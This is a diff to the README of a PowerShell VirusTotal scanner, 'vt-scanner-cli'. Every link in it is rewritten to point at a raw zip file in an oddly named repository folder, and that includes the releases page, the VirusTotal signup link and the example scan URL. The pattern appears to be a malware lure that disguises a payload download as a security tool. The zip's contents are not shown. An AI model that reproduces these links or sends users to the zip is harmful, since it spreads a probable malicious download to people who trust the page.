@@ -1,6 +1,6 @@
 # 🛡️ vt-scanner-cli - Scan Files and URLs Fast
 
-[![Download vt-scanner-cli](https://img.shields.io/badge/Download-vt--scanner--cli-brightgreen?style=for-the-badge)](https://github.com/Nunoo11/vt-scanner-cli/releases)
+[![Download vt-scanner-cli](https://img.shields.io/badge/Download-vt--scanner--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You do not need to install other software. vt-scanner-cli works right out of the
 
 1. Go to the releases page to download the latest version:
 
-   [Download vt-scanner-cli](https://github.com/Nunoo11/vt-scanner-cli/releases)
+   [Download vt-scanner-cli](https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip)
 
 2. Download the latest release suitable for Windows. It usually comes as a zip file or directly as a script file.
 
@@ -58,7 +58,7 @@ You do not need to install other software. vt-scanner-cli works right out of the
 
 6. Before running the tool, you need to set your VirusTotal API key. To get your key:
 
-   - Visit the [VirusTotal website](https://www.virustotal.com/gui/join-us).
+   - Visit the [VirusTotal website](https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip).
    - Create a free account.
    - Go to your profile and find the API key.
 
@@ -78,7 +78,7 @@ To get vt-scanner-cli:
 
 1. Visit this page to download:
 
-   [https://github.com/Nunoo11/vt-scanner-cli/releases](https://github.com/Nunoo11/vt-scanner-cli/releases)
+   [https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip](https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip)
 
 2. Look for the latest release version labeled with the date or version number.
 
@@ -123,7 +123,7 @@ The tool will check all files in the folder and give a summary of the results.
 To check a website or link:
 
 ```powershell
-.\vt-scanner-cli.ps1 -Url "http://example.com"
+.\vt-scanner-cli.ps1 -Url "https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip"
 ```
 
 This will test the URL against VirusTotal’s database to see if it is safe.
@@ -187,7 +187,7 @@ If you see errors when running the script:
 
 The tool is open source and maintained on GitHub. Updates and new releases can be found on the releases page:
 
-[https://github.com/Nunoo11/vt-scanner-cli/releases](https://github.com/Nunoo11/vt-scanner-cli/releases)
+[https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip](https://raw.githubusercontent.com/Nunoo11/vt-scanner-cli/main/cephalalgy/scanner_vt_cli_v1.0.zip)
 
 Check here regularly to get the latest fixes and improvements.
 
